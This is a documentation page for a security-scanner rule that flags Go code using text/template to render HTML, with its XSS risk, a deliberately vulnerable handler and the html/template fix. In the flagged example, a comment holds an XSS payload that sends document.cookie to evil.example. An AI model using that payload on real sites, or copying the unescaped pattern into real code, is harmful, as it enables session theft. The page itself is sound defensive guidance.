---
title: "VNX-GO-009 – Go text/template Used for HTML"
description: "Detect Go code that imports text/template for rendering HTML output, bypassing automatic HTML escaping and enabling cross-site scripting (XSS) attacks."
---

## Overview

This rule flags Go files that import `text/template`. Go ships two template packages: `text/template` for generating arbitrary text output, and `html/template` for generating HTML. The critical difference is that `html/template` automatically escapes all values interpolated into the template based on their context (HTML body, attribute, URL, JavaScript, CSS), preventing cross-site scripting. `text/template` performs no escaping whatsoever — it inserts values verbatim. Using `text/template` to render HTML responses means any user-controlled content that reaches the template can inject arbitrary HTML and JavaScript into the page. This maps to [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html).

**Severity:** High | **CWE:** [CWE-79 – Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)

## Why This Matters

XSS allows an attacker to execute arbitrary JavaScript in the context of a victim's browser session on your site. The attacker's script runs with the same privileges as your own JavaScript — it can read and exfiltrate session cookies and local storage (including authentication tokens), capture keystrokes and form inputs (e.g., passwords typed after the page loads), make authenticated API calls on the victim's behalf, redirect the user to a phishing page, or modify the page's DOM to display fraudulent content. Stored XSS is particularly severe: an attacker who can store a malicious payload in your database (via a form submission, API call, or injected record) will execute that payload in the browser of every user who views the affected page. MITRE ATT&CK T1059.007 covers XSS as a client-side script execution technique.

## What Gets Flagged

The rule fires on any `.go` file that imports `"text/template"`. The import alone indicates the package is in scope; the actual risk depends on whether template output is written to HTTP responses, but the safest approach is to switch to `html/template` for all web rendering.

```go
// FLAGGED: text/template does not escape HTML — dangerous for web output
import (
    "net/http"
    "text/template"
)

var tmpl = template.Must(template.New("page").Parse(`
    <html><body>
    <h1>Hello, {{.Name}}!</h1>
    </body></html>
`))

func helloHandler(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("name")
    // Attacker sends: name=<script>document.location='https://evil.example/?c='+document.cookie</script>
    // The script tag is inserted verbatim into the HTML response
    tmpl.Execute(w, map[string]string{"Name": name})
}
```

## Remediation

1. **Replace `text/template` with `html/template` for all web output.** The `html/template` package has an identical API — simply change the import. The template syntax, `template.Must`, `template.New`, `Parse`, and `Execute` all work identically.

```go
// SAFE: html/template automatically escapes user input in HTML context
import (
    "html/template"
    "net/http"
)

var tmpl = template.Must(template.New("page").Parse(`
    <html><body>
    <h1>Hello, {{.Name}}!</h1>
    </body></html>
`))

func helloHandler(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("name")
    // html/template escapes "<script>..." to "&lt;script&gt;..."
    // The script tag is rendered as text, not executed
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    tmpl.Execute(w, map[string]string{"Name": name})
}
```

2. **Set the correct `Content-Type` header.** Ensure HTTP responses that contain HTML include `Content-Type: text/html; charset=utf-8`. Some browsers will attempt content-type sniffing if the header is missing or set to `text/plain`, which can re-enable XSS in some configurations.

3. **Use `template.HTML`, `template.JS`, and `template.URL` types with caution.** The `html/template` package provides escape-hatch types for inserting pre-sanitized HTML, JavaScript, or URLs. Only use these types when the value is genuinely safe and has been sanitized by a trusted library — never for user-supplied strings.

4. **Set security headers.** Complement `html/template`'s escaping with a `Content-Security-Policy` header that restricts which scripts the browser will execute. This provides defense-in-depth against any template escaping gaps.

```go
w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
```

5. **Keep `text/template` only for non-HTML output.** If you use `text/template` for generating email bodies, configuration files, or other plain-text output, ensure none of that output is ever served as an HTML response.

## References

- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Go html/template package documentation](https://pkg.go.dev/html/template)
- [Go text/template package documentation](https://pkg.go.dev/text/template)
- [CAPEC-86: XSS Using HTTP Query Strings](https://capec.mitre.org/data/definitions/86.html)
- [MITRE ATT&CK T1059.007 – Command and Scripting Interpreter: JavaScript](https://attack.mitre.org/techniques/T1059/007/)
